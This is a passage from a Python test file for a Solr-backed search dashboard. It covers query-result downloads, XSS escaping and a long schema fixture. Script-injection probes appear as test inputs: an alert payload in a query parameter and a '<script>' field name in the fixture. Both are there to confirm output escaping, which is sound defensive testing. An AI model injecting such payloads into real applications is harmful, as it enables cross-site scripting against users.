Canada."",""language"":""eng"",""_version_"":1450807667479019520}]},""facet_counts"":{""facet_queries"":{},""facet_fields"":{""journal_title"":[""in"",4,""frontiers"",2,""angewandte"",1,""chemie"",1,""ed"",1,""english"",1,""fetal"",1,""human"",1,""international"",1,""medicine"",1,""microbiology"",1,""neonatal"",1,""neuroscience"",1,""seminars"",1],""author_facet"":[""Annalisa A Guaragna"",1,""Arthur A Van Aerschot"",1,""B B Hallberg"",1,""Daniele D D'Alonzo"",1,""Guy G Schepers"",1,""Haruyoshi H Tomita"",1,""Hidetada H Hirakawa"",1,""J L N JL Thibodeau"",1,""Jussara J Amato"",1,""K Z H KZ Li"",1,""L H LH Baer"",1,""M M Blennow"",1,""Matheus M Froeyen"",1,""Piet P Herdewijn"",1,""T M TM Gralnick"",1,""V B VB Penhune"",1]},""facet_dates"":{""article_date"":{""gap"":""+1DAYS"",""start"":""2013-04-27T00:00:00Z"",""end"":""2013-06-28T00:00:00Z""}},""facet_ranges"":{}},""highlighting"":{""23680099"":{},""23670912"":{},""23720655"":{},""23717275"":{}},""spellcheck"":{""suggestions"":[""correctlySpelled"",false]}}"""""")

    json_response = self.c.post(reverse('dashboard:download'), {
        'type': 'json',
        'collection': json.dumps(self._get_collection_param(self.collection)),
        'query': json.dumps(QUERY)
    })

    json_response_content = json.loads(json_response.content)
    assert_equal('application/json', json_response['Content-Type'])
    assert_equal('attachment; filename=query_result.json', json_response['Content-Disposition'])
    assert_equal(4, len(json_response_content), len(json_response_content))
    assert_equal('Investigations for neonatal seizures.', json_response_content[0]['article_title'])

    csv_response = self.c.post(reverse('dashboard:download'), {
        'type': 'csv',
        'collection': json.dumps(self._get_collection_param(self.collection)),
        'query': json.dumps(QUERY)
    })
    csv_response_content = ''.join(csv_response.streaming_content)
    assert_equal('application/csv', csv_response['Content-Type'])
    assert_equal('attachment; filename=query_result.csv', csv_response['Content-Disposition'])
    assert_equal(4 + 1 + 1, len(csv_response_content.split('\n')), csv_response_content.split('\n'))
    assert_true('&lt;script&gt;alert(1234)&lt;/script&gt;,_version_,author,category,comments,content,content_type,description,features,inStock,includes,keywords,last_modified,links,manu,manu_exact,name,payloads,popularity,price,resourcename,sku,store,subject,text,text_rev,title,url,weight,id' in csv_response_content, csv_response_content)
    # Fields does not exactly match the response but this is because the collection schema does not match the query response.
    assert_true("""""",1450807641462800385,""['B B Hallberg', 'M M Blennow']"",,,,,,,,,,,,,,,,,,,,,,,,,,,23680099"""""" in csv_response_content, csv_response_content)

    xls_response = self.c.post(reverse('dashboard:download'), {
        'type': 'xls',
        'collection': json.dumps(self._get_collection_param(self.collection)),
        'query': json.dumps(QUERY)
    })
    xls_response_content = ''.join(xls_response.content)
    assert_not_equal(0, len(xls_response_content))
    assert_equal('application/vnd.openxmlformats-officedocument.spreadsheetml.sheet', xls_response['Content-Type'])
    assert_equal('attachment; filename=query_result.xlsx', xls_response['Content-Disposition'])

  def test_index_xss(self):
    doc = Document2.objects.create(name='test_dashboard', type='search-dashboard', owner=self.user,
                                   data=json.dumps(self.collection.data), parent_directory=self.home_dir)
    try:
      response = self.c.get(reverse('dashboard:index') + ('?collection=%s' % doc.id) + '&q=</script><script>alert(%27XSS%27)</script>')
      assert_equal('{""fqs"": [], ""qs"": [{""q"": ""alert(\'XSS\')""}], ""start"": 0}', response.context['query'])
    finally:
      doc.delete()

  def test_augment_response(self):
    collection = self._get_collection_param(self.collection)
    query = QUERY
    response = {
      'response': {
        'docs': [
          {'id': 111, ""link-meta"": ""{\""type\"": \""hdfs\"", \""path\"": \""/user/hue/pdf/sql_editor.pdf\""}""}
        ]
      }
    }

    # Don't blow-up with Expecting property name: line 1 column 1 (char 1)
    augment_response(collection, query, response)


SOLR_LUKE_SCHEMA = """"""{""responseHeader"":{""status"":0,""QTime"":2},""index"":{""numDocs"":8,""maxDoc"":8,""deletedDocs"":0,""version"":15,""segmentCount"":5,""current"":true,""hasDeletions"":false,""directory"":""org.apache.lucene.store.NRTCachingDirectory:NRTCachingDirectory(org.apache.solr.store.hdfs.HdfsDirectory@5efe087b lockFactory=org.apache.solr.store.hdfs.HdfsLockFactory@5106def2; maxCacheMB=192.0 maxMergeSizeMB=16.0)"",""userData"":{""commitTimeMSec"":""1389233070579""},""lastModified"":""2014-01-09T02:04:30.579Z""},""schema"":{""fields"":{""_version_"":{""type"":""long"",""flags"":""ITS-----OF------"",""copyDests"":[],""copySources"":[]},""author"":{""type"":""text_general"",""flags"":""ITS-------------"",""positionIncrementGap"":100,""copyDests"":[""author_s"",""text""],""copySources"":[]},""<script>alert(1234)</script>"":{""type"":""string"",""flags"":""I-S-M---OF-----l"",""copyDests"":[""text""],""copySources"":[]},""category"":{""type"":""text_general"",""flags"":""ITS-------------"",""positionIncrementGap"":100,""copyDests"":[],""copySources"":[]},""comments"":{""type"":""text_general"",""flags"":""ITS-------------"",""positionIncrementGap"":100,""copyDests"":[],""copySources"":[]},""content"":{""type"":""text_general"",""flags"":""-TS-M-----------"",""positionIncrementGap"":100,""copyDests"":[""text""],""copySources"":[]},""content_type"":{""type"":""string"",""flags"":""I-S-M---OF-----l"",""copyDests"":[""text""],""copySources"":[]},""description"":{""type"":""text_general"",""flags"":""ITS-------------"",""positionIncrementGap"":100,""copyDests"":[""text""],""copySources"":[]},""features"":{""type"":""text_general"",""flags"":""ITS-M-----------"",""positionIncrementGap"":100,""copyDests"":[""text""],""copySources"":[]},""id"":{""type"":""string"",""flags"":""I-S-----OF-----l"",""required"":true,""uniqueKey"":true,""copyDests"":[],""copySources"":[]},""inStock"":{""type"":""boolean"",""flags"":""I-S-----OF-----l"",""copyDests"":[],""copySources"":[]},""includes"":{""type"":""text_general"",""flags"":""ITS--Vop--------"",""positionIncrementGap"":100,""copyDests"":[""text""],""copySources"":[]},""keywords"":{""type"":""text_general"",""flags"":""ITS-------------"",""positionIncrementGap"":100,""copyDests"":[""text""],""copySources"":[]},""last_modified"":{""type"":""date"",""flags"":""ITS------F------"",""copyDests"":[],""copySources"":[]},""links"":{""type"":""string"",""flags"":""I-S-M---OF-----l"",""copyDests"":[],""copySources"":[]},""manu"":{""type"":""text_general"",""flags"":""ITS-----O-------"",""positionIncrementGap"":100,""copyDests"":[""text"",""manu_exact""],""copySources"":[]},""manu_exact"":{""type"":""string"",""flags"":""I-------OF-----l"",""copyDests"":[],""copySources"":[""manu""]},""name"":{""type"":""text_general"",""flags"":""ITS-------------"",""positionIncrementGap"":100,""copyDests"":[""text""],""copySources"":[]},""payloads"":{""type"":""payloads"",""flags"":""ITS-------------"",""copyDests"":[],""copySources"":[]},""popularity"":{""type"":""int"",""flags"":""ITS-----OF------"",""copyDests"":[],""copySources"":[]},""price"":{""type"":""float"",""flags"":""ITS-----OF------"",""copyDests"":[""price_c""],""copySources"":[]},""resourcename"":{""type"":""text_general"",""flags"":""ITS-------------"",""positionIncrementGap"":100,""copyDests"":[""text""],""copySources"":[]},""sku"":{""type"":""text_en_splitting_tight"",""flags"":""ITS-----O-------"",""positionIncrementGap"":100,""copyDests"":[],""copySources"":[]},""store"":{""type"":""location"",""flags"":""I-S------F------"",""copyDests"":[],""copySources"":[]},""subject"":{""type"":""text_general"",""flags"":""ITS-------------"",""positionIncrementGap"":100,""copyDests"":[],""copySources"":[]},""text"":{""type"":""text_general"",""flags"":""IT--M-----------"",""positionIncrementGap"":100,""copyDests"":[],""copySources"":[""cat"",""keywords"",""resourcename"",""includes"",""url"",""content"",""author"",""title"",""manu"",""description"",""name"",""features"",""content_type""]},""text_rev"":{""type"":""text_general_rev"",""flags"":""IT--M-----------"",""positionIncrementGap"":100,""copyDests"":[],""copySources"":[]},""title"":{""type"":""text_general"",""flags"":""ITS-M-----------"",""positionIncrementGap"":100,""copyDests"":[""text""],""copySources"":[]},""url"":{""type"":""text_general"",""flags"":""ITS-------------"",""positionIncrementGap"":100,""copyDests"":[""text""],""copySources"":[]},""weight"":{""type"":""float"",""flags"":""ITS-----OF------"",""copyDests"":[],""copySources"":[]}},""dynamicFields"":{""*____amount_raw"":{""type"":""amount_raw_type_tlong"",""flags"":""IT------O-------"",""copyDests"":[],""copySources"":[]},""*____currency"":{""type"":""currency_type_string"",""flags"":""I-------O-------"",""copyDests"":[],""copySources"":[]},""*_b"":{""type"":""boolean"",""flags"":""I-S-----OF-----l"",""copyDests"":[],""copySources"":[]},""*_bs"":{""type"":""boolean"",""flags"":""I-S-M---OF-----l"",""copyDests"":[],""copySources"":[]},""*_c"":{""type"":""currency"",""flags"":""I-S------F------"",""copyDests"":[],""copySources"":[]},""*_coordinate"":{""type"":""tdouble"",""flags"":""IT------OF------"",""copyDests"":[],""copySources"":[]},""*_d"":{""type"":""double"",""flags"":""ITS-----OF------"",""copyDests"":[],""copySources"":[]},""*_ds"":{""type"":""double"",""flags"":""ITS-M---OF------"",""copyDests"":[],""copySources"":[]},""*_dt"":{""type"":""date"",""flags"":""ITS------F------"",""copyDests"":[],""copySources"":[]},""*_dts"":{""type"":""date"",""flags"":""ITS-M----F------"",""copyDests"":[],""copySources"":[]},""*_en"":{""type"":""text_en"",""flags"":""ITS-M-----------"",""positionIncrementGap"":100,""copyDests"":[],""copySources"":[]},""*_f"":{""type"":""float"",""flags"":""ITS-----OF------"",""copyDests"":[],""copySources"":[]},""*_fs"":{""type"":""float"",""flags"":""ITS-M---OF------"",""copyDests"":[],""copySources"":[]},""*_i"":{""type"":""int"",""flags"":""ITS-----OF------"",""copyDests"":[],""copySources"":[]},""*_is"":{""type"":""int"",""flags"":""ITS-M---OF------"",""copyDests"":[],""copySources"":[]},""*_l"":{""type"":""long"",""flags"":""ITS-----OF------"",""copyDests"":[],""copySources"":[]},""*_ls"":{""type"":""long"",""flags"":""ITS-M---OF------"",""copyDests"":[],""copySources"":[]},""*_p"":{""type"":""location"",""flags"":""I-S------F------"",""copyDests"":[],""copySources"":[]},""*_pi"":{""type"":""pint"",""flags"":""I-S-----OF------"",""copyDests"":[],""copySources"":[]},""*_s"":{""type"":""string"",""flags"":""I-S-----OF-----l"",""copyDests"":[],""copySources"":[]},""*_ss"":{""type"":""string"",""flags"":""I-S-M---OF-----l"",""copyDests"":[],""copySources"":[]},""*_t"":{""type"":""text_general"",""flags"":""ITS-------------"",""positionIncrementGap"":100,""copyDests"":[],""copySources"":[]},""*_td"":{""type"":""tdouble"",""flags"":""ITS-----OF------"",""copyDests"":[],""copySources"":[]},""*_tdt"":{""type"":""tdate"",""flags"":""ITS------F------"",""copyDests"":[],""copySources"":[]},""*_tf"":{""type"":""tfloat"",""flags"":""ITS-----OF------"",""copyDests"":[],""copySources"":[]},""*_ti"":{""type"":""tint"",""flags"":""ITS-----OF------"",""copyDests"":[],""copySources"":[]},""*_tl"":{""type"":""tlong"",""flags"":""ITS-----OF------"",""copyDests"":[],""copySources"":[]},""*_txt"":{""type"":""text_general"",""flags"":""ITS-M-----------"",""positionIncrementGap"":100,""copyDests"":[],""copySources"":[]},""attr_*"":{""type"":""text_general"",""flags"":""ITS-M-----------"",""positionIncrementGap"":100,""copyDests"":[],""copySources"":[]},""ignored_*"":{""type"":""ignored"",""flags"":""----M---OF------"",""copyDests"":[],""copySources"":[]},""random_*"":{""type"":""random"",""flags"":""I-S------F------"",""copyDests"":[],""copySources"":[]}},""uniqueKeyField"":""id"",""defaultSearchField"":null,""types"":{""alphaOnlySort"":{""fields"":null,""tokenized"":true,""className"":""org.apache.solr.schema.TextField"",""indexAnalyzer"":{""className"":""org.apache.solr.analysis.TokenizerChain"",""tokenizer"":{""className"":""org.apache.lucene.analysis.core.KeywordTokenizerFactory"",""args"":{""class"":""solr.KeywordTokenizerFactory"",""luceneMatchVersion"":""LUCENE_44""}},""filters"":{""LowerCaseFilterFactory"":{""args"":{""class"":""solr.LowerCaseFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.core.LowerCaseFilterFactory""},""TrimFilterFactory"":{""args"":{""class"":""solr.TrimFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.miscellaneous.TrimFilterFactory""},""PatternReplaceFilterFactory"":{""args"":{""replace"":""all"",""replacement"":"""",""pattern"":""([^a-z])"",""class"":""solr.PatternReplaceFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.pattern.PatternReplaceFilterFactory""}}},""queryAnalyzer"":{""className"":""org.apache.solr.analysis.TokenizerChain"",""tokenizer"":{""className"":""org.apache.lucene.analysis.core.KeywordTokenizerFactory"",""args"":{""class"":""solr.KeywordTokenizerFactory"",""luceneMatchVersion"":""LUCENE_44""}},""filters"":{""LowerCaseFilterFactory"":{""args"":{""class"":""solr.LowerCaseFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.core.LowerCaseFilterFactory""},""TrimFilterFactory"":{""args"":{""class"":""solr.TrimFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.miscellaneous.TrimFilterFactory""},""PatternReplaceFilterFactory"":{""args"":{""replace"":""all"",""replacement"":"""",""pattern"":""([^a-z])"",""class"":""solr.PatternReplaceFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.pattern.PatternReplaceFilterFactory""}}},""similarity"":{}},""ancestor_path"":{""fields"":null,""tokenized"":true,""className"":""org.apache.solr.schema.TextField"",""indexAnalyzer"":{""className"":""org.apache.solr.analysis.TokenizerChain"",""tokenizer"":{""className"":""org.apache.lucene.analysis.core.KeywordTokenizerFactory"",""args"":{""class"":""solr.KeywordTokenizerFactory"",""luceneMatchVersion"":""LUCENE_44""}}},""queryAnalyzer"":{""className"":""org.apache.solr.analysis.TokenizerChain"",""tokenizer"":{""className"":""org.apache.lucene.analysis.path.PathHierarchyTokenizerFactory"",""args"":{""delimiter"":""/"",""class"":""solr.PathHierarchyTokenizerFactory"",""luceneMatchVersion"":""LUCENE_44""}}},""similarity"":{}},""binary"":{""fields"":null,""tokenized"":false,""className"":""org.apache.solr.schema.BinaryField"",""indexAnalyzer"":{""className"":""org.apache.solr.schema.FieldType$DefaultAnalyzer""},""queryAnalyzer"":{""className"":""org.apache.solr.schema.FieldType$DefaultAnalyzer""},""similarity"":{}},""boolean"":{""fields"":[""inStock"",""*_bs"",""*_b""],""tokenized"":false,""className"":""org.apache.solr.schema.BoolField"",""indexAnalyzer"":{""className"":""org.apache.solr.schema.BoolField$1""},""queryAnalyzer"":{""className"":""org.apache.solr.schema.BoolField$1""},""similarity"":{}},""currency"":{""fields"":[""*_c""],""tokenized"":false,""className"":""org.apache.solr.schema.CurrencyField"",""indexAnalyzer"":{""className"":""org.apache.solr.schema.FieldType$DefaultAnalyzer""},""queryAnalyzer"":{""className"":""org.apache.solr.schema.FieldType$DefaultAnalyzer""},""similarity"":{}},""date"":{""fields"":[""last_modified"",""*_dts"",""*_dt""],""tokenized"":true,""className"":""org.apache.solr.schema.TrieDateField"",""indexAnalyzer"":{""className"":""org.apache.solr.analysis.TokenizerChain"",""tokenizer"":{""className"":""org.apache.solr.analysis.TrieTokenizerFactory"",""args"":{}}},""queryAnalyzer"":{""className"":""org.apache.solr.analysis.TokenizerChain"",""tokenizer"":{""className"":""org.apache.solr.analysis.TrieTokenizerFactory"",""args"":{}}},""similarity"":{}},""descendent_path"":{""fields"":null,""tokenized"":true,""className"":""org.apache.solr.schema.TextField"",""indexAnalyzer"":{""className"":""org.apache.solr.analysis.TokenizerChain"",""tokenizer"":{""className"":""org.apache.lucene.analysis.path.PathHierarchyTokenizerFactory"",""args"":{""delimiter"":""/"",""class"":""solr.PathHierarchyTokenizerFactory"",""luceneMatchVersion"":""LUCENE_44""}}},""queryAnalyzer"":{""className"":""org.apache.solr.analysis.TokenizerChain"",""tokenizer"":{""className"":""org.apache.lucene.analysis.core.KeywordTokenizerFactory"",""args"":{""class"":""solr.KeywordTokenizerFactory"",""luceneMatchVersion"":""LUCENE_44""}}},""similarity"":{}},""double"":{""fields"":[""*_ds"",""*_d""],""tokenized"":true,""className"":""org.apache.solr.schema.TrieDoubleField"",""indexAnalyzer"":{""className"":""org.apache.solr.analysis.TokenizerChain"",""tokenizer"":{""className"":""org.apache.solr.analysis.TrieTokenizerFactory"",""args"":{}}},""queryAnalyzer"":{""className"":""org.apache.solr.analysis.TokenizerChain"",""tokenizer"":{""className"":""org.apache.solr.analysis.TrieTokenizerFactory"",""args"":{}}},""similarity"":{}},""float"":{""fields"":[""weight"",""price"",""*_fs"",""*_f""],""tokenized"":true,""className"":""org.apache.solr.schema.TrieFloatField"",""indexAnalyzer"":{""className"":""org.apache.solr.analysis.TokenizerChain"",""tokenizer"":{""className"":""org.apache.solr.analysis.TrieTokenizerFactory"",""args"":{}}},""queryAnalyzer"":{""className"":""org.apache.solr.analysis.TokenizerChain"",""tokenizer"":{""className"":""org.apache.solr.analysis.TrieTokenizerFactory"",""args"":{}}},""similarity"":{}},""ignored"":{""fields"":[""ignored_*""],""tokenized"":false,""className"":""org.apache.solr.schema.StrField"",""indexAnalyzer"":{""className"":""org.apache.solr.schema.FieldType$DefaultAnalyzer""},""queryAnalyzer"":{""className"":""org.apache.solr.schema.FieldType$DefaultAnalyzer""},""similarity"":{}},""int"":{""fields"":[""popularity"",""*_is"",""*_i""],""tokenized"":true,""className"":""org.apache.solr.schema.TrieIntField"",""indexAnalyzer"":{""className"":""org.apache.solr.analysis.TokenizerChain"",""tokenizer"":{""className"":""org.apache.solr.analysis.TrieTokenizerFactory"",""args"":{}}},""queryAnalyzer"":{""className"":""org.apache.solr.analysis.TokenizerChain"",""tokenizer"":{""className"":""org.apache.solr.analysis.TrieTokenizerFactory"",""args"":{}}},""similarity"":{}},""location"":{""fields"":[""store"",""*_p""],""tokenized"":false,""className"":""org.apache.solr.schema.LatLonType"",""indexAnalyzer"":{""className"":""org.apache.solr.schema.FieldType$DefaultAnalyzer""},""queryAnalyzer"":{""className"":""org.apache.solr.schema.FieldType$DefaultAnalyzer""},""similarity"":{}},""location_rpt"":{""fields"":null,""tokenized"":false,""className"":""org.apache.solr.schema.SpatialRecursivePrefixTreeFieldType"",""indexAnalyzer"":{""className"":""org.apache.solr.schema.FieldType$DefaultAnalyzer""},""queryAnalyzer"":{""className"":""org.apache.solr.schema.FieldType$DefaultAnalyzer""},""similarity"":{}},""long"":{""fields"":[""_version_"",""*_ls"",""*_l""],""tokenized"":true,""className"":""org.apache.solr.schema.TrieLongField"",""indexAnalyzer"":{""className"":""org.apache.solr.analysis.TokenizerChain"",""tokenizer"":{""className"":""org.apache.solr.analysis.TrieTokenizerFactory"",""args"":{}}},""queryAnalyzer"":{""className"":""org.apache.solr.analysis.TokenizerChain"",""tokenizer"":{""className"":""org.apache.solr.analysis.TrieTokenizerFactory"",""args"":{}}},""similarity"":{}},""lowercase"":{""fields"":null,""tokenized"":true,""className"":""org.apache.solr.schema.TextField"",""indexAnalyzer"":{""className"":""org.apache.solr.analysis.TokenizerChain"",""tokenizer"":{""className"":""org.apache.lucene.analysis.core.KeywordTokenizerFactory"",""args"":{""class"":""solr.KeywordTokenizerFactory"",""luceneMatchVersion"":""LUCENE_44""}},""filters"":{""LowerCaseFilterFactory"":{""args"":{""class"":""solr.LowerCaseFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.core.LowerCaseFilterFactory""}}},""queryAnalyzer"":{""className"":""org.apache.solr.analysis.TokenizerChain"",""tokenizer"":{""className"":""org.apache.lucene.analysis.core.KeywordTokenizerFactory"",""args"":{""class"":""solr.KeywordTokenizerFactory"",""luceneMatchVersion"":""LUCENE_44""}},""filters"":{""LowerCaseFilterFactory"":{""args"":{""class"":""solr.LowerCaseFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.core.LowerCaseFilterFactory""}}},""similarity"":{}},""payloads"":{""fields"":[""payloads""],""tokenized"":true,""className"":""org.apache.solr.schema.TextField"",""indexAnalyzer"":{""className"":""org.apache.solr.analysis.TokenizerChain"",""tokenizer"":{""className"":""org.apache.lucene.analysis.core.WhitespaceTokenizerFactory"",""args"":{""class"":""solr.WhitespaceTokenizerFactory"",""luceneMatchVersion"":""LUCENE_44""}},""filters"":{""DelimitedPayloadTokenFilterFactory"":{""args"":{""class"":""solr.DelimitedPayloadTokenFilterFactory"",""luceneMatchVersion"":""LUCENE_44"",""encoder"":""float""},""className"":""org.apache.lucene.analysis.payloads.DelimitedPayloadTokenFilterFactory""}}},""queryAnalyzer"":{""className"":""org.apache.solr.analysis.TokenizerChain"",""tokenizer"":{""className"":""org.apache.lucene.analysis.core.WhitespaceTokenizerFactory"",""args"":{""class"":""solr.WhitespaceTokenizerFactory"",""luceneMatchVersion"":""LUCENE_44""}},""filters"":{""DelimitedPayloadTokenFilterFactory"":{""args"":{""class"":""solr.DelimitedPayloadTokenFilterFactory"",""luceneMatchVersion"":""LUCENE_44"",""encoder"":""float""},""className"":""org.apache.lucene.analysis.payloads.DelimitedPayloadTokenFilterFactory""}}},""similarity"":{}},""pdate"":{""fields"":null,""tokenized"":false,""className"":""org.apache.solr.schema.DateField"",""indexAnalyzer"":{""className"":""org.apache.solr.schema.FieldType$DefaultAnalyzer""},""queryAnalyzer"":{""className"":""org.apache.solr.schema.FieldType$DefaultAnalyzer""},""similarity"":{}},""pdouble"":{""fields"":null,""tokenized"":false,""className"":""org.apache.solr.schema.DoubleField"",""indexAnalyzer"":{""className"":""org.apache.solr.schema.FieldType$DefaultAnalyzer""},""queryAnalyzer"":{""className"":""org.apache.solr.schema.FieldType$DefaultAnalyzer""},""similarity"":{}},""pfloat"":{""fields"":null,""tokenized"":false,""className"":""org.apache.solr.schema.FloatField"",""indexAnalyzer"":{""className"":""org.apache.solr.schema.FieldType$DefaultAnalyzer""},""queryAnalyzer"":{""className"":""org.apache.solr.schema.FieldType$DefaultAnalyzer""},""similarity"":{}},""phonetic"":{""fields"":null,""tokenized"":true,""className"":""org.apache.solr.schema.TextField"",""indexAnalyzer"":{""className"":""org.apache.solr.analysis.TokenizerChain"",""tokenizer"":{""className"":""org.apache.lucene.analysis.standard.StandardTokenizerFactory"",""args"":{""class"":""solr.StandardTokenizerFactory"",""luceneMatchVersion"":""LUCENE_44""}},""filters"":{""DoubleMetaphoneFilterFactory"":{""args"":{""inject"":""false"",""class"":""solr.DoubleMetaphoneFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.phonetic.DoubleMetaphoneFilterFactory""}}},""queryAnalyzer"":{""className"":""org.apache.solr.analysis.TokenizerChain"",""tokenizer"":{""className"":""org.apache.lucene.analysis.standard.StandardTokenizerFactory"",""args"":{""class"":""solr.StandardTokenizerFactory"",""luceneMatchVersion"":""LUCENE_44""}},""filters"":{""DoubleMetaphoneFilterFactory"":{""args"":{""inject"":""false"",""class"":""solr.DoubleMetaphoneFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.phonetic.DoubleMetaphoneFilterFactory""}}},""similarity"":{}},""pint"":{""fields"":[""*_pi""],""tokenized"":false,""className"":""org.apache.solr.schema.IntField"",""indexAnalyzer"":{""className"":""org.apache.solr.schema.FieldType$DefaultAnalyzer""},""queryAnalyzer"":{""className"":""org.apache.solr.schema.FieldType$DefaultAnalyzer""},""similarity"":{}},""plong"":{""fields"":null,""tokenized"":false,""className"":""org.apache.solr.schema.LongField"",""indexAnalyzer"":{""className"":""org.apache.solr.schema.FieldType$DefaultAnalyzer""},""queryAnalyzer"":{""className"":""org.apache.solr.schema.FieldType$DefaultAnalyzer""},""similarity"":{}},""point"":{""fields"":null,""tokenized"":false,""className"":""org.apache.solr.schema.PointType"",""indexAnalyzer"":{""className"":""org.apache.solr.schema.FieldType$DefaultAnalyzer""},""queryAnalyzer"":{""className"":""org.apache.solr.schema.FieldType$DefaultAnalyzer""},""similarity"":{}},""random"":{""fields"":[""random_*""],""tokenized"":false,""className"":""org.apache.solr.schema.RandomSortField"",""indexAnalyzer"":{""className"":""org.apache.solr.schema.FieldType$DefaultAnalyzer""},""queryAnalyzer"":{""className"":""org.apache.solr.schema.FieldType$DefaultAnalyzer""},""similarity"":{}},""string"":{""fields"":[""cat"",""id"",""manu_exact"",""content_type"",""links"",""*_ss"",""*_s""],""tokenized"":false,""className"":""org.apache.solr.schema.StrField"",""indexAnalyzer"":{""className"":""org.apache.solr.schema.FieldType$DefaultAnalyzer""},""queryAnalyzer"":{""className"":""org.apache.solr.schema.FieldType$DefaultAnalyzer""},""similarity"":{}},""tdate"":{""fields"":[""*_tdt""],""tokenized"":true,""className"":""org.apache.solr.schema.TrieDateField"",""indexAnalyzer"":{""className"":""org.apache.solr.analysis.TokenizerChain"",""tokenizer"":{""className"":""org.apache.solr.analysis.TrieTokenizerFactory"",""args"":{}}},""queryAnalyzer"":{""className"":""org.apache.solr.analysis.TokenizerChain"",""tokenizer"":{""className"":""org.apache.solr.analysis.TrieTokenizerFactory"",""args"":{}}},""similarity"":{}},""tdouble"":{""fields"":[""*_coordinate"",""*_td""],""tokenized"":true,""className"":""org.apache.solr.schema.TrieDoubleField"",""indexAnalyzer"":{""className"":""org.apache.solr.analysis.TokenizerChain"",""tokenizer"":{""className"":""org.apache.solr.analysis.TrieTokenizerFactory"",""args"":{}}},""queryAnalyzer"":{""className"":""org.apache.solr.analysis.TokenizerChain"",""tokenizer"":{""className"":""org.apache.solr.analysis.TrieTokenizerFactory"",""args"":{}}},""similarity"":{}},""text_ar"":{""fields"":null,""tokenized"":true,""className"":""org.apache.solr.schema.TextField"",""indexAnalyzer"":{""className"":""org.apache.solr.analysis.TokenizerChain"",""tokenizer"":{""className"":""org.apache.lucene.analysis.standard.StandardTokenizerFactory"",""args"":{""class"":""solr.StandardTokenizerFactory"",""luceneMatchVersion"":""LUCENE_44""}},""filters"":{""LowerCaseFilterFactory"":{""args"":{""class"":""solr.LowerCaseFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.core.LowerCaseFilterFactory""},""StopFilterFactory"":{""args"":{""words"":""lang/stopwords_ar.txt"",""class"":""solr.StopFilterFactory"",""ignoreCase"":""true"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.core.StopFilterFactory""},""ArabicNormalizationFilterFactory"":{""args"":{""class"":""solr.ArabicNormalizationFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.ar.ArabicNormalizationFilterFactory""},""ArabicStemFilterFactory"":{""args"":{""class"":""solr.ArabicStemFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.ar.ArabicStemFilterFactory""}}},""queryAnalyzer"":{""className"":""org.apache.solr.analysis.TokenizerChain"",""tokenizer"":{""className"":""org.apache.lucene.analysis.standard.StandardTokenizerFactory"",""args"":{""class"":""solr.StandardTokenizerFactory"",""luceneMatchVersion"":""LUCENE_44""}},""filters"":{""LowerCaseFilterFactory"":{""args"":{""class"":""solr.LowerCaseFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.core.LowerCaseFilterFactory""},""StopFilterFactory"":{""args"":{""words"":""lang/stopwords_ar.txt"",""class"":""solr.StopFilterFactory"",""ignoreCase"":""true"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.core.StopFilterFactory""},""ArabicNormalizationFilterFactory"":{""args"":{""class"":""solr.ArabicNormalizationFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.ar.ArabicNormalizationFilterFactory""},""ArabicStemFilterFactory"":{""args"":{""class"":""solr.ArabicStemFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.ar.ArabicStemFilterFactory""}}},""similarity"":{}},""text_bg"":{""fields"":null,""tokenized"":true,""className"":""org.apache.solr.schema.TextField"",""indexAnalyzer"":{""className"":""org.apache.solr.analysis.TokenizerChain"",""tokenizer"":{""className"":""org.apache.lucene.analysis.standard.StandardTokenizerFactory"",""args"":{""class"":""solr.StandardTokenizerFactory"",""luceneMatchVersion"":""LUCENE_44""}},""filters"":{""LowerCaseFilterFactory"":{""args"":{""class"":""solr.LowerCaseFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.core.LowerCaseFilterFactory""},""StopFilterFactory"":{""args"":{""words"":""lang/stopwords_bg.txt"",""class"":""solr.StopFilterFactory"",""ignoreCase"":""true"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.core.StopFilterFactory""},""BulgarianStemFilterFactory"":{""args"":{""class"":""solr.BulgarianStemFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.bg.BulgarianStemFilterFactory""}}},""queryAnalyzer"":{""className"":""org.apache.solr.analysis.TokenizerChain"",""tokenizer"":{""className"":""org.apache.lucene.analysis.standard.StandardTokenizerFactory"",""args"":{""class"":""solr.StandardTokenizerFactory"",""luceneMatchVersion"":""LUCENE_44""}},""filters"":{""LowerCaseFilterFactory"":{""args"":{""class"":""solr.LowerCaseFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.core.LowerCaseFilterFactory""},""StopFilterFactory"":{""args"":{""words"":""lang/stopwords_bg.txt"",""class"":""solr.StopFilterFactory"",""ignoreCase"":""true"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.core.StopFilterFactory""},""BulgarianStemFilterFactory"":{""args"":{""class"":""solr.BulgarianStemFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene